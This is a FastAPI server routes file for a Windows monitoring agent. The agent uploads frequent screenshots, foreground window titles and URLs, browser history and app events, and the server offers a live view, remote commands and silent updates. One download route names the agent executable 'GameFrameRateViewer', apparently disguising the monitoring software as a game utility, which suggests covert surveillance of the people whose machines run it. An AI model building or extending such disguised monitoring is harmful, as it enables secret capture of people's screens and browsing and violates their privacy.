"""
FastAPI 路由定义
"""
import hashlib
import os
import base64
import json
from collections import deque
from datetime import datetime, timedelta
from typing import Optional

from fastapi import APIRouter, HTTPException, Query, Request
from fastapi.responses import FileResponse

from models import (
    init_db, upsert_agent, get_agents, delete_agent, rename_agent, get_db,
    save_screenshot, get_screenshots, get_latest_screenshot,
    get_screenshot_dates, get_screenshot_hours,
    ensure_screenshot_variant,
    delete_screenshot, delete_screenshots_batch, delete_screenshots_range,
    save_app_event, get_app_usage_summary,
    save_browser_history, get_browser_history,
    get_browser_history_with_screenshots,
    get_app_events, get_app_events_with_screenshots,
    get_dashboard_stats,
    get_storage_stats, cleanup_old_screenshots,
    save_diagnostic, query_diagnostics, get_diagnostic_categories,
    get_agent_by_ip, get_agent_by_machine_id,
    set_agent_update_permission, clear_agent_update_permission,
    create_agent_command, claim_next_agent_command, finish_agent_command,
    register_agent_version, get_agent_version, get_active_agent_version,
    set_active_agent_version, list_agent_versions,
    create_agent_update_job, get_latest_update_job, get_update_job,
    claim_next_update_job, update_job_heartbeat, finish_update_job,
    cancel_update_job, retry_update_job, list_update_events,
    reap_stale_update_jobs,
    list_screenshot_rules, create_screenshot_rule, update_screenshot_rule,
    delete_screenshot_rule,
)
from logger import log, format_log_entry

router = APIRouter(prefix="/api")

# 观察者心跳 - 记录 Dashboard 最后访问时间
_viewer_last_seen: dict[str, datetime] = {}

# Agent 上报的当前截图间隔
_agent_intervals: dict[str, float] = {}

# Live 最新帧缓存。它不入库，只服务实时画面；历史/网格仍读取 screenshots 表。
_latest_live_frames: dict[tuple[str, int], dict] = {}
_live_frame_buffers: dict[tuple[str, int], deque] = {}
LIVE_DELAY_SECONDS = float(os.getenv("LIVE_DELAY_SECONDS", "5"))
LIVE_BUFFER_SECONDS = float(os.getenv("LIVE_BUFFER_SECONDS", "15"))
LIVE_FRESH_MAX_AGE_SECONDS = float(os.getenv("LIVE_FRESH_MAX_AGE_SECONDS", "30"))
SPECIAL_RULE_WARMUP_SECONDS = int(os.getenv("SCREENSHOT_RULE_WARMUP_SECONDS", "10"))
SPECIAL_RULE_KEEPALIVE_SECONDS = int(os.getenv("SCREENSHOT_RULE_KEEPALIVE_SECONDS", "300"))


def _parse_iso_datetime(value: str) -> datetime:
    try:
        return datetime.fromisoformat(str(value).replace("Z", "+00:00")).replace(tzinfo=None)
    except (TypeError, ValueError):
        return datetime.now()


def _store_live_frame(agent_name: str, monitor_index: int, frame: dict):
    key = (agent_name, int(monitor_index or 0))
    frame["_received_at"] = datetime.now()
    frame["_captured_at"] = _parse_iso_datetime(frame.get("timestamp", ""))
    _latest_live_frames[key] = frame

    buf = _live_frame_buffers.setdefault(key, deque())
    buf.append(frame)
    cutoff = datetime.now() - timedelta(seconds=max(LIVE_BUFFER_SECONDS, LIVE_DELAY_SECONDS + 2))
    while buf and buf[0].get("_received_at", cutoff) < cutoff:
        buf.popleft()


def _public_live_frame(frame: dict) -> dict:
    return {k: v for k, v in frame.items() if not k.startswith("_")}


def _select_delayed_live_frame(agent_name: str, monitor_index: int | None = None) -> dict | None:
    target_time = datetime.now() - timedelta(seconds=max(0, LIVE_DELAY_SECONDS))
    if monitor_index is not None:
        candidates = list(_live_frame_buffers.get((agent_name, int(monitor_index)), ()))
    else:
        candidates = [
            frame
            for (name, _), buf in _live_frame_buffers.items()
            if name == agent_name
            for frame in buf
        ]

    ready = [frame for frame in candidates if frame.get("_received_at", datetime.now()) <= target_time]
    if ready:
        return _public_live_frame(max(ready, key=lambda item: item.get("_received_at", datetime.min)))

    if monitor_index is not None:
        latest = _latest_live_frames.get((agent_name, int(monitor_index)))
        if latest and latest.get("_received_at", datetime.now()) <= target_time:
            return _public_live_frame(latest)
        return None

    latest_candidates = [frame for (name, _), frame in _latest_live_frames.items() if name == agent_name]
    ready_latest = [frame for frame in latest_candidates if frame.get("_received_at", datetime.now()) <= target_time]
    if ready_latest:
        return _public_live_frame(max(ready_latest, key=lambda item: item.get("_received_at", datetime.min)))
    return None


def _select_fresh_live_frame(
    agent_name: str,
    monitor_index: int | None = None,
    max_age_seconds: float = LIVE_FRESH_MAX_AGE_SECONDS,
) -> dict | None:
    cutoff = datetime.now() - timedelta(seconds=max(0.1, max_age_seconds))
    if monitor_index is not None:
        latest = _latest_live_frames.get((agent_name, int(monitor_index)))
        if latest and latest.get("_received_at", datetime.min) >= cutoff:
            return _public_live_frame(latest)
        return None

    candidates = [
        frame
        for (name, _), frame in _latest_live_frames.items()
        if name == agent_name and frame.get("_received_at", datetime.min) >= cutoff
    ]
    if candidates:
        return _public_live_frame(max(candidates, key=lambda item: item.get("_received_at", datetime.min)))
    return None


# ============================================
# 健康检查
# ============================================

@router.get("/health")
async def health():
    return {"status": "ok", "time": datetime.now().isoformat()}


# ============================================
# 观察者心跳 & 动态配置
# ============================================

@router.post("/viewer/heartbeat")
async def viewer_heartbeat():
    """Dashboard 每秒 ping 此接口，表示有人正在观看"""
    _viewer_last_seen["dashboard"] = datetime.now()
    return {"status": "ok"}


@router.get("/config")
async def agent_config(agent: str = Query("unknown")):
    """Agent 拉取动态配置 - 根据观察者存在与否调整截图间隔"""
    last_seen = _viewer_last_seen.get("dashboard")
    if last_seen and (datetime.now() - last_seen).total_seconds() < 10:
        screenshot_interval = 1   # 有人看 → 1秒
    else:
        screenshot_interval = 5   # 没人看 → 5秒
    return {
        "screenshot_interval": screenshot_interval,
        "app_track_interval": 2,
        "special_screenshot_rules": list_screenshot_rules(enabled_only=True),
        "special_screenshot_rule_warmup_seconds": SPECIAL_RULE_WARMUP_SECONDS,
        "special_screenshot_rule_keepalive_seconds": SPECIAL_RULE_KEEPALIVE_SECONDS,
    }


# ============================================
# 数据接收 (Agent -> Server)
# ============================================

@router.post("/register")
async def register_agent(data: dict):
    """原子注册 — 按 machine_id 去重，同一台机器始终返回同一个名称"""
    desired = (data.get("agent_name") or "unknown").strip()
    machine_id = (data.get("machine_id") or "").strip()

    # 优先按 machine_id 查找：同一台机器重复注册 → 返回已有名称
    if machine_id:
        existing = get_agent_by_machine_id(machine_id)
        if existing:
            upsert_agent(existing["name"], "online", machine_id=machine_id)
            return {"status": "ok", "agent_name": existing["name"]}

    # 名称冲突检测：被其他在线 Agent 占用时自动加后缀
    agents = get_agents()
    online_names = {a['name'] for a in agents if a['status'] == 'online'}
    if desired in online_names:
        suffix = 2
        while f"{desired}-{suffix}" in online_names:
            suffix += 1
        resolved = f"{desired}-{suffix}"
    else:
        resolved = desired

    upsert_agent(resolved, "online", machine_id=machine_id)
    return {"status": "ok", "agent_name": resolved}


@router.post("/heartbeat")
async def heartbeat(data: dict):
    """接收 Agent 心跳"""
    agent_name = data.get("agent_name", "unknown")
    ip = data.get("ip", "")
    machine_id = data.get("machine_id", "")
    install_id = data.get("install_id", "")
    updater_version = data.get("updater_version", "")
    update_job_id = data.get("update_job_id", "")
    agent_version = data.get("agent_version", "")
    update_status = data.get("update_status", "")
    update_target_version = data.get("update_target_version", "")
    update_error = data.get("update_error", "")
    control_status = data.get("control_status", "")
    upsert_agent(
        agent_name,
        "online",
        ip=ip,
        machine_id=machine_id,
        agent_version=agent_version,
        update_status=update_status,
        update_target_version=update_target_version,
        update_error=update_error,
        control_status=control_status,
        install_id=install_id,
        updater_version=updater_version,
        update_job_id=update_job_id,
    )
    # 记录 Agent 当前截图间隔
    interval = data.get("screenshot_interval", 0)
    if interval:
        _agent_intervals[agent_name] = interval
    return {"status": "ok"}


@router.post("/status")
async def agent_status(data: dict):
    """接收 Agent 状态更新"""
    agent_name = data.get("agent_name", "unknown")
    status = data.get("status", "online")
    message = data.get("message", "")
    machine_id = data.get("machine_id", "")
    install_id = data.get("install_id", "")
    updater_version = data.get("updater_version", "")
    update_job_id = data.get("update_job_id", "")
    agent_version = data.get("agent_version", "")
    update_status = data.get("update_status", "")
    update_target_version = data.get("update_target_version", "")
    update_error = data.get("update_error", "")
    control_status = data.get("control_status", "")
    upsert_agent(
        agent_name,
        status,
        message,
        machine_id=machine_id,
        agent_version=agent_version,
        update_status=update_status,
        update_target_version=update_target_version,
        update_error=update_error,
        control_status=control_status,
        install_id=install_id,
        updater_version=updater_version,
        update_job_id=update_job_id,
    )
    return {"status": "ok"}


ALLOWED_AGENT_COMMANDS = {"pause_capture", "resume_capture"}


@router.post("/agents/{agent_name}/commands")
async def create_control_command(agent_name: str, data: dict):
    """Web 下发 Agent 控制命令。"""
    command = (data.get("command") or "").strip()
    if command not in ALLOWED_AGENT_COMMANDS:
        raise HTTPException(status_code=400, detail="不支持的 Agent 控制命令")
    payload = data.get("payload") or {}
    if not isinstance(payload, str):
        payload = json.dumps(payload, ensure_ascii=False)
    item = create_agent_command(agent_name, command, payload or "{}")
    if not item:
        raise HTTPException(status_code=404, detail="Agent 不存在")
    return {"status": "ok", "command": item}


@router.get("/agent/commands/poll")
async def poll_agent_command(agent: str = Query(...)):
    """Agent 拉取下一条待执行控制命令。"""
    command = claim_next_agent_command(agent)
    return {"status": "ok", "command": command}


@router.post("/agent/commands/{command_id}/result")
async def finish_control_command(command_id: int, data: dict):
    """Agent 回报控制命令执行结果。"""
    status = (data.get("status") or "done").strip()
    result = data.get("result") or ""
    ok = finish_agent_command(command_id, status, result)
    if not ok:
        raise HTTPException(status_code=404, detail="命令不存在")
    return {"status": "ok"}


@router.post("/screenshot")
async def screenshot(data: dict):
    """接收截图"""
    agent_name = data.get("agent_name", "unknown")
    timestamp = data.get("timestamp", datetime.now().isoformat())
    image_b64 = data.get("image_base64", "")
    monitor_index = data.get("monitor_index", 0)
    monitor_total = data.get("monitor_total", 1)

    if not image_b64:
        raise HTTPException(status_code=400, detail="缺少截图数据")

    # 更新 agent 在线状态
    upsert_agent(agent_name, "online")

    capture_interval = data.get("capture_interval", 0)
    if capture_interval:
        try:
            _agent_intervals[agent_name] = float(capture_interval)
        except (TypeError, ValueError):
            pass

    live_frame = {
        "id": f"live:{agent_name}:{monitor_index}:{timestamp}",
        "agent_name": agent_name,
        "timestamp": timestamp,
        "image_base64": image_b64,
        "format": data.get("format", "jpeg"),
        "monitor_index": monitor_index,
        "monitor_total": monitor_total,
        "capture_interval": capture_interval,
        "foreground_process_name": data.get("foreground_process_name", ""),
        "foreground_window_title": data.get("foreground_window_title", ""),
        "foreground_url": data.get("foreground_url", ""),
        "matched_rule_type": data.get("matched_rule_type", ""),
        "matched_rule_pattern": data.get("matched_rule_pattern", ""),
        "save_policy_phase": data.get("save_policy_phase", ""),
    }
    _store_live_frame(agent_name, int(monitor_index or 0), live_frame)

    store_history = bool(data.get("store_history", True))
    if not store_history:
        return {"status": "ok", "id": None}

    # 入库存储仍执行 2 秒节流；Live 画面读取上面的内存最新帧，不受节流影响。
    screenshot_id = save_screenshot(agent_name, timestamp, image_b64,
                                    monitor_index, monitor_total, {
                                        "foreground_process_name": data.get("foreground_process_name", ""),
                                        "foreground_window_title": data.get("foreground_window_title", ""),
                                        "foreground_url": data.get("foreground_url", ""),
                                        "matched_rule_type": data.get("matched_rule_type", ""),
                                        "matched_rule_pattern": data.get("matched_rule_pattern", ""),
                                        "save_policy_phase": data.get("save_policy_phase", ""),
                                    })
    return {"status": "ok", "id": screenshot_id}


@router.get("/screenshot-rules")
async def get_screenshot_rules():
    return {
        "items": list_screenshot_rules(enabled_only=False),
        "warmup_seconds": SPECIAL_RULE_WARMUP_SECONDS,
        "keepalive_seconds": SPECIAL_RULE_KEEPALIVE_SECONDS,
    }


@router.post("/screenshot-rules")
async def add_screenshot_rule(data: dict):
    rule_type = (data.get("rule_type") or "").strip()
    pattern = (data.get("pattern") or "").strip()
    enabled = bool(data.get("enabled", True))
    if rule_type not in {"process", "url_contains"}:
        raise HTTPException(status_code=400, detail="不支持的规则类型")
    if not pattern:
        raise HTTPException(status_code=400, detail="规则内容不能为空")
    return {"item": create_screenshot_rule(rule_type, pattern, enabled)}


@router.patch("/screenshot-rules/{rule_id}")
async def patch_screenshot_rule(rule_id: int, data: dict):
    rule_type = data.get("rule_type")
    pattern = data.get("pattern")
    enabled = data.get("enabled") if "enabled" in data else None
    if rule_type is not None and rule_type not in {"process", "url_contains"}:
        raise HTTPException(status_code=400, detail="不支持的规则类型")
    if pattern is not None and not str(pattern).strip():
        raise HTTPException(status_code=400, detail="规则内容不能为空")
    item = update_screenshot_rule(
        rule_id,
        rule_type=str(rule_type).strip() if rule_type is not None else None,
        pattern=str(pattern).strip() if pattern is not None else None,
        enabled=bool(enabled) if enabled is not None else None,
    )
    if not item:
        raise HTTPException(status_code=404, detail="规则不存在")
    return {"item": item}


@router.delete("/screenshot-rules/{rule_id}")
async def remove_screenshot_rule(rule_id: int):
    if not delete_screenshot_rule(rule_id):
        raise HTTPException(status_code=404, detail="规则不存在")
    return {"status": "ok"}


@router.post("/app_event")
async def app_event(data: dict):
    """接收应用事件"""
    agent_name = data.get("agent_name", "unknown")
    upsert_agent(agent_name, "online")
    save_app_event(agent_name, data)
    return {"status": "ok"}


@router.post("/browser_history")
async def browser_history(data: dict):
    """接收浏览器历史"""
    agent_name = data.get("agent_name", "unknown")
    records = data.get("records", [])
    upsert_agent(agent_name, "online")
    if records:
        save_browser_history(agent_name, records)
    return {"status": "ok", "count": len(records)}


# ============================================
# 数据查询 (Dashboard -> Server)
# ============================================

@router.get("/dashboard/stats")
async def dashboard_stats(agent: Optional[str] = Query(None)):
    """仪表盘统计数据"""
    return get_dashboard_stats(agent)


@router.get("/storage/stats")
async def storage_stats():
    """存储使用统计 — 总量、Agent 明细"""
    return get_storage_stats()


@router.post("/storage/cleanup")
async def storage_cleanup(data: dict):
    """清理过期截图  {older_than_hours: 480, agent: "name"?}"""
    hours = data.get("older_than_hours", 480)
    agent = data.get("agent")
    if not isinstance(hours, (int, float)) or hours <= 0:
        raise HTTPException(status_code=400, detail="older_than_hours 必须是正整数")
    return cleanup_old_screenshots(int(hours), agent)


# ============================================
# 诊断日志 API
# ============================================

@router.post("/diagnostics")
async def agent_diagnostics(data: dict):
    """Agent 上报诊断信息  {agent_name, category, level, message}"""
    agent_name = data.get("agent_name", "")
    category = data.get("category", "system")
    level = data.get("level", "INFO")
    message = data.get("message", "")

    if not message:
        raise HTTPException(status_code=400, detail="message 不能为空")

    entry = format_log_entry(category, level.upper(), f"{message} (agent={agent_name})")

    # 写入文件日志
    if level.upper() == "ERROR":
        log.error(entry, extra={"category": category})
    elif level.upper() == "WARNING":
        log.warning(entry, extra={"category": category})
    else:
        log.info(entry, extra={"category": category})

    # 写入数据库
    log_id = save_diagnostic(agent_name, category, level.upper(), message)
    return {"status": "ok", "id": log_id}


@router.get("/logs")
async def query_logs(
    category: Optional[str] = Query(None),
    level: Optional[str] = Query(None),
    agent: Optional[str] = Query(None),
    pattern: Optional[str] = Query(None),
    limit: int = Query(200, le=1000),
    offset: int = Query(0),
):
    """查询诊断日志 — 支持正则搜索"""
    return query_diagnostics(category, level, agent, pattern, limit, offset)


@router.get("/logs/categories")
async def log_categories():
    """日志分类及计数"""
    return get_diagnostic_categories()


@router.get("/agents")
async def list_agents():
    """Agent 列表，附带当前截图间隔"""
    agents = get_agents()
    for a in agents:
        a["screenshot_interval"] = _agent_intervals.get(a["name"], 0)
        # display_name 为空时回退到 name
        a["display_name"] = a.get("display_name") or a["name"]
    return agents


@router.delete("/agents/{agent_name}")
async def remove_agent(agent_name: str):
    """删除 Agent 及其所有关联数据（截图、事件、浏览器历史）"""
    result = delete_agent(agent_name)
    if result is None:
        raise HTTPException(status_code=404, detail="Agent 不存在或名称非法")
    # 清理内存中的状态
    _agent_intervals.pop(agent_name, None)
    return {"status": "ok", **result}


@router.patch("/agents/{agent_name}")
async def update_agent_display_name(agent_name: str, data: dict):
    """修改 Agent 显示名称"""
    display_name = data.get("display_name", "").strip()
    if not display_name:
        raise HTTPException(status_code=400, detail="display_name 不能为空")
    ok = rename_agent(agent_name, display_name)
    if not ok:
        raise HTTPException(status_code=404, detail="Agent 不存在")
    return {"status": "ok", "display_name": display_name}


@router.get("/screenshots")
async def list_screenshots(
    agent: Optional[str] = Query(None),
    limit: int = Query(50, le=10000),
    offset: int = Query(0),
    date_from: Optional[str] = Query(None),
    date_to: Optional[str] = Query(None),
    monitor: Optional[int] = Query(None),
):
    """截图列表，支持日期范围/显示器筛选"""
    return get_screenshots(agent, limit, offset, date_from, date_to, monitor)


@router.get("/screenshots/latest")
async def latest_screenshot(agent: str = Query(...), monitor: Optional[int] = Query(None)):
    """获取最新截图，可选指定显示器"""
    result = get_latest_screenshot(agent, monitor)
    if not result:
        raise HTTPException(status_code=404, detail="暂无截图")
    return result


@router.get("/screenshots/live/latest")
async def latest_live_screenshot(
    agent: str = Query(...),
    monitor: Optional[int] = Query(None),
    fallback: bool = Query(False),
    fresh: bool = Query(False),
    max_age: Optional[float] = Query(None),
):
    """获取 Agent 最近一次上传的实时帧，不受截图入库节流影响"""
    if fresh:
        result = _select_fresh_live_frame(agent, monitor, max_age or LIVE_FRESH_MAX_AGE_SECONDS)
        if result:
            return result
    result = _select_delayed_live_frame(agent, monitor)
    if result:
        return result
    if fallback:
        stored = get_latest_screenshot(agent, monitor) if monitor is not None else get_latest_screenshot(agent)
        if stored:
            return stored
    raise HTTPException(status_code=404, detail="暂无实时截图")


@router.get("/screenshots/dates")
async def screenshot_dates(
    agent: str = Query(...),
    date_from: str = Query("", description="可选，YYYY-MM-DD 或 ISO 时间"),
    date_to: str = Query("", description="可选，YYYY-MM-DD 或 ISO 时间"),
):
    """返回有截图的日期列表及每天数量"""
    return get_screenshot_dates(agent, date_from, date_to)


@router.get("/screenshots/hours")
async def screenshot_hours(agent: str = Query(...), date: str = Query(...)):
    """返回指定日期内有截图的小时列表及每小时数量"""
    return get_screenshot_hours(agent, date)


@router.get("/screenshots/image/{screenshot_id}")
async def screenshot_image(screenshot_id: int):
    """返回截图文件"""
    db = get_db()
    row = db.execute(
        "SELECT file_path FROM screenshots WHERE id = ?", (screenshot_id,)
    ).fetchone()
    if not row or not os.path.exists(row["file_path"]):
        raise HTTPException(status_code=404, detail="截图文件不存在")
    return FileResponse(row["file_path"], media_type="image/jpeg")


@router.get("/screenshots/thumb/{screenshot_id}")
async def screenshot_thumb(screenshot_id: int):
    """返回网格缩略图，旧数据缺失时自动生成"""
    db = get_db()
    row = db.execute(
        "SELECT file_path FROM screenshots WHERE id = ?", (screenshot_id,)
    ).fetchone()
    if not row or not os.path.exists(row["file_path"]):
        raise HTTPException(status_code=404, detail="截图文件不存在")
    path = ensure_screenshot_variant(row["file_path"], "thumb")
    return FileResponse(path, media_type="image/jpeg")


@router.get("/screenshots/preview/{screenshot_id}")
async def screenshot_preview(screenshot_id: int):
    """返回大图预览图，旧数据缺失时自动生成"""
    db = get_db()
    row = db.execute(
        "SELECT file_path FROM screenshots WHERE id = ?", (screenshot_id,)
    ).fetchone()
    if not row or not os.path.exists(row["file_path"]):
        raise HTTPException(status_code=404, detail="截图文件不存在")
    path = ensure_screenshot_variant(row["file_path"], "preview")
    return FileResponse(path, media_type="image/jpeg")


@router.post("/screenshots/thumbs-batch")
async def screenshot_thumbs_batch(data: dict):
    """批量返回网格缩略图，减少大量小图片请求的连接开销"""
    ids = data.get("ids", [])
    if not isinstance(ids, list) or not ids:
        raise HTTPException(status_code=400, detail="缺少 ids")
    ids = [int(sid) for sid in ids[:500]]
    placeholders = ",".join(["?"] * len(ids))
    db = get_db()
    rows = db.execute(
        f"SELECT id, file_path FROM screenshots WHERE id IN ({placeholders})",
        ids,
    ).fetchall()
    by_id = {row["id"]: row for row in rows}
    thumbs = []
    for sid in ids:
        row = by_id.get(sid)
        if not row or not os.path.exists(row["file_path"]):
            continue
        path = ensure_screenshot_variant(row["file_path"], "thumb")
        try:
            with open(path, "rb") as f:
                image_b64 = base64.b64encode(f.read()).decode("ascii")
            thumbs.append({"id": sid, "image_base64": image_b64})
        except OSError:
            continue
    return {"thumbs": thumbs}


@router.delete("/screenshots/{screenshot_id}")
async def delete_single_screenshot(screenshot_id: int):
    """删除单张截图"""
    ok = delete_screenshot(screenshot_id)
    if not ok:
        raise HTTPException(status_code=404, detail="截图不存在")
    return {"status": "ok", "deleted": 1}


@router.post("/screenshots/delete-batch")
async def delete_batch_screenshots(data: dict):
    """批量删除截图  {ids: [1, 2, 3]}"""
    ids = data.get("ids", [])
    if not ids:
        raise HTTPException(status_code=400, detail="缺少 ids")
    count = delete_screenshots_batch(ids)
    return {"status": "ok", "deleted": count}


@router.post("/screenshots/delete-range")
async def delete_range_screenshots(data: dict):
    """按时间段删除截图  {agent, date_from, date_to, monitor?}"""
    agent = data.get("agent")
    date_from = data.get("date_from")
    date_to = data.get("date_to")
    monitor = data.get("monitor")

    if not agent:
        raise HTTPException(status_code=400, detail="缺少 agent")
    if not date_from or not date_to:
        raise HTTPException(status_code=400, detail="缺少 date_from/date_to")
    if date_from > date_to:
        raise HTTPException(status_code=400, detail="date_from 不能晚于 date_to")
    if monitor is not None and not isinstance(monitor, int):
        raise HTTPException(status_code=400, detail="monitor 必须是整数")

    result = delete_screenshots_range(agent, date_from, date_to, monitor)
    return {"status": "ok", **result}


@router.get("/app_usage")
async def app_usage(
    agent: str = Query(...),
    date: Optional[str] = Query(None),
):
    """应用使用汇总"""
    return get_app_usage_summary(agent, date)


@router.get("/app_events")
async def app_events_list(
    agent: str = Query(...),
    limit: int = Query(50, le=5000),
    offset: int = Query(0),
    with_screenshots: bool = Query(False),
    monitor: Optional[int] = Query(None),
    date_from: Optional[str] = Query(None),
    date_to: Optional[str] = Query(None),
):
    """最近应用事件时间线 - 可选关联截图"""
    if with_screenshots:
        return get_app_events_with_screenshots(agent, limit, offset, monitor, date_from, date_to)
    return get_app_events(agent, limit)


@router.get("/browser_history")
async def browser_history_list(
    agent: Optional[str] = Query(None),
    limit: int = Query(100, le=500),
    offset: int = Query(0),
    with_screenshots: bool = Query(False),
    monitor: Optional[int] = Query(None),
):
    """浏览器历史列表 - 可选关联截图"""
    if with_screenshots:
        return get_browser_history_with_screenshots(agent, limit, offset, monitor)
    return get_browser_history(agent, limit, offset)


# ============================================
# Agent 下载
# ============================================

@router.post("/agent/detect")
async def detect_agent(request: Request):
    """检测当前客户端是否已安装 Agent（通过客户端 IP 匹配）"""
    client_ip = request.client.host if request.client else ""
    # 去掉 IPv6 前缀 ::ffff:
    if client_ip.startswith("::ffff:"):
        client_ip = client_ip[7:]

    agent = get_agent_by_ip(client_ip)
    if agent:
        return {
            "found": True,
            "agent_name": agent["name"],
            "status": agent["status"],
        }
    return {"found": False}


SERVER_DIR = os.path.dirname(__file__)
AGENT_STATIC_DIR = os.path.join(SERVER_DIR, "static", "agent")
AGENT_SETUP_PATH = os.path.join(AGENT_STATIC_DIR, "WindowsMonitorSetup.exe")
AGENT_EXE_PATH = os.path.join(AGENT_STATIC_DIR, "monitor-agent.exe")
AGENT_LEGACY_VERSION = "0.59.0"
AGENT_RELEASES_DIR = os.getenv("AGENT_RELEASES_DIR", "/app/releases/agent")
AGENT_RELEASE_EXE_NAME = "monitor-agent.exe"
AGENT_RELEASE_SETUP_NAME = "WindowsMonitorSetup.exe"


def _file_sha256(path: str) -> str:
    digest = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest().upper()


def _release_paths(version: str) -> tuple[str, str]:
    safe_version = os.path.basename(str(version or "").strip())
    return (
        os.path.join(AGENT_RELEASES_DIR, safe_version, AGENT_RELEASE_EXE_NAME),
        os.path.join(AGENT_RELEASES_DIR, safe_version, AGENT_RELEASE_SETUP_NAME),
    )


def _register_agent_release_from_paths(version: str, exe_path: str, setup_path: str,
                                       is_active: bool = False) -> dict:
    if not os.path.exists(exe_path):
        raise HTTPException(status_code=404, detail=f"Agent 文件缺失: {exe_path}")
    if not os.path.exists(setup_path):
        raise HTTPException(status_code=404, detail=f"安装器文件缺失: {setup_path}")
    return register_agent_version(
        version,
        exe_path=exe_path,
        setup_path=setup_path,
        exe_sha256=_file_sha256(exe_path),
        setup_sha256=_file_sha256(setup_path),
        exe_size_bytes=os.path.getsize(exe_path),
        setup_size_bytes=os.path.getsize(setup_path),
        updater_version=version,
        is_active=is_active,
    )


def _ensure_legacy_agent_version() -> dict | None:
    existing = get_agent_version(AGENT_LEGACY_VERSION)
    if existing:
        return existing
    if os.path.exists(AGENT_EXE_PATH) and os.path.exists(AGENT_SETUP_PATH):
        return _register_agent_release_from_paths(
            AGENT_LEGACY_VERSION,
            AGENT_EXE_PATH,
            AGENT_SETUP_PATH,
            is_active=get_active_agent_version() is None,
        )
    return None


def _ensure_release_version(version: str, activate: bool = False) -> dict:
    exe_path, setup_path = _release_paths(version)
    if not os.path.exists(exe_path) or not os.path.exists(setup_path):
        existing = get_agent_version(version)
        if existing and existing.get("exe_path") and existing.get("setup_path"):
            return existing
    return _register_agent_release_from_paths(version, exe_path, setup_path, is_active=activate)


def _agent_version_row(version: str | None = None) -> dict:
    _ensure_legacy_agent_version()
    row = get_agent_version(version) if version else get_active_agent_version()
    if not row:
        raise HTTPException(status_code=404, detail="尚未注册 Agent 发布版本")
    if not os.path.exists(row.get("exe_path", "")):
        raise HTTPException(status_code=404, detail=f"Agent 文件缺失: {row.get('exe_path', '')}")
    if not os.path.exists(row.get("setup_path", "")):
        raise HTTPException(status_code=404, detail=f"安装器文件缺失: {row.get('setup_path', '')}")
    return row


def _agent_version_payload(version: str | None = None) -> dict:
    row = _agent_version_row(version)
    version_text = row["version"]
    exe_path = row.get("exe_path", "")
    setup_path = row.get("setup_path", "")
    exe_sha = _file_sha256(exe_path)
    setup_sha = _file_sha256(setup_path)
    exe_size = os.path.getsize(exe_path)
    setup_size = os.path.getsize(setup_path)
    register_agent_version(
        version_text,
        exe_path=exe_path,
        setup_path=setup_path,
        exe_sha256=exe_sha,
        setup_sha256=setup_sha,
        exe_size_bytes=exe_size,
        setup_size_bytes=setup_size,
        updater_version=version_text,
        is_active=bool(row.get("is_active")),
    )
    return {
        "version": version_text,
        "download_url": f"/api/agent/download?v={version_text}",
        "exe_url": "/api/agent/exe",
        "package_exe_url": f"/api/agent/packages/{version_text}/exe",
        "package_setup_url": f"/api/agent/packages/{version_text}/setup",
        "sha256": exe_sha,
        "setup_sha256": setup_sha,
        "size_bytes": exe_size,
        "setup_size_bytes": setup_size,
        "released_at": datetime.fromtimestamp(os.path.getmtime(setup_path)).isoformat(),
        "stable": True,
        "force_update": False,
        "is_active": bool(row.get("is_active")),
    }


def _version_tuple(value: str) -> tuple[int, ...]:
    text = str(value or "").strip().lower().lstrip("v")
    parts = []
    for item in text.split("."):
        try:
            parts.append(int(item))
        except ValueError:
            parts.append(0)
    return tuple(parts or [0])


def _is_newer_version(latest: str, current: str) -> bool:
    return _version_tuple(latest) > _version_tuple(current)


@router.get("/agent/version")
async def agent_version():
    """当前可下载 Agent 版本元数据。"""
    return _agent_version_payload()


@router.get("/agent/versions")
async def agent_versions():
    """可发布 Agent 版本列表。"""
    _ensure_legacy_agent_version()
    return {"versions": list_agent_versions()}


@router.post("/agent/versions/register")
async def register_agent_release(data: dict):
    """注册宿主机 releases/agent/{version} 下的 Agent 发布包。"""
    version = (data.get("version") or "").strip()
    if not version:
        raise HTTPException(status_code=400, detail="version 不能为空")
    activate = bool(data.get("activate", False))
    item = _ensure_release_version(version, activate=activate)
    return {"status": "ok", "version": _agent_version_payload(item["version"])}


@router.post("/agent/versions/{version}/activate")
async def activate_agent_release(version: str):
    """把已注册版本设为当前激活版本。"""
    _agent_version_row(version)
    item = set_active_agent_version(version)
    if not item:
        raise HTTPException(status_code=404, detail="指定版本不存在")
    return {"status": "ok", "version": _agent_version_payload(version)}


@router.get("/agent/versions/latest")
async def latest_agent_version():
    """当前稳定 Agent 版本。"""
    return _agent_version_payload()


@router.get("/agent/exe")
async def download_agent_exe():
    """下载 Agent 可执行文件，供已安装 Agent 后台更新使用。"""
    payload = _agent_version_payload()
    row = _agent_version_row(payload["version"])
    return FileResponse(
        path=row["exe_path"],
        filename="monitor-agent.exe",
        media_type="application/vnd.microsoft.portable-executable",
        headers={
            "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
            "Pragma": "no-cache",
            "Expires": "0",
        },
    )


@router.get("/agent/packages/{version}/exe")
async def download_agent_package_exe(version: str):
    """下载指定版本 Agent exe。新更新 job 使用不可变版本 URL。"""
    row = _agent_version_row(version)
    return FileResponse(
        path=row["exe_path"],
        filename=f"GameFrameRateViewer-{version}.exe",
        media_type="application/vnd.microsoft.portable-executable",
        headers={
            "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
            "Pragma": "no-cache",
            "Expires": "0",
        },
    )


@router.get("/agent/packages/{version}/setup")
async def download_agent_package_setup(version: str):
    """下载指定版本安装器。"""
    row = _agent_version_row(version)
    return FileResponse(
        path=row["setup_path"],
        filename=f"WindowsMonitorSetup-{version}.exe",
        media_type="application/vnd.microsoft.portable-executable",
        headers={
            "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
            "Pragma": "no-cache",
            "Expires": "0",
        },
    )


@router.get("/agent/update/check")
async def check_agent_update(agent: str = Query(...), version: str = Query("")):
    """Agent 检查是否允许安装最新版。"""
    agents = {item["name"]: item for item in get_agents()}
    row = agents.get(agent)
    if not row:
        raise HTTPException(status_code=404, detail="Agent 不存在")

    latest = _agent_version_payload()
    latest_job = get_latest_update_job(agent)
    allowed_version = row.get("update_allowed_version") or ""
    if latest_job and latest_job.get("status") in ("pending", "claimed", "downloading", "downloaded", "installing", "restarting", "waiting_login", "verifying", "failed"):
        allowed_version = latest_job.get("target_version") or allowed_version
    target_payload = latest
    if allowed_version:
        try:
            target_payload = _agent_version_payload(allowed_version)
        except HTTPException:
            target_payload = latest
